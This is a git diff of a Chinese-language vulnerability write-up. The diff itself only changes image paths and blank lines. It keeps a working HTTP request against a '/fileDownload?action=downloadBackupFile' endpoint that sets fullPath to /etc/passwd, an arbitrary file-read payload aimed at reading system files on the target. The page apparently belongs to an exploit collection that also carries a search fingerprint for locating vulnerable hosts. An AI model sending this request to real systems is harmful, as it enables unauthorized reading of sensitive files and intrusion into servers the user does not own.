@@ -20,17 +20,11 @@ body="/him/api/rest/v1.0/node/role"
 
 登陆页面如下
 
-
-
-![](images/202202101900721.png)
-
-
+![](<../.gitbook/assets/202202101900721 (1).png>)
 
 发送请求包
 
-
-
-```plain
+```
 POST /fileDownload?action=downloadBackupFile HTTP/1.1
 Host: 
 Content-Length: 24
@@ -46,10 +40,6 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 fullPath=%2Fetc%2Fpasswd
 ```
 
+![](../.gitbook/assets/202202101900651.png)
 
-
-![](images/202202101900651.png)
-
-
-
-## 
+##
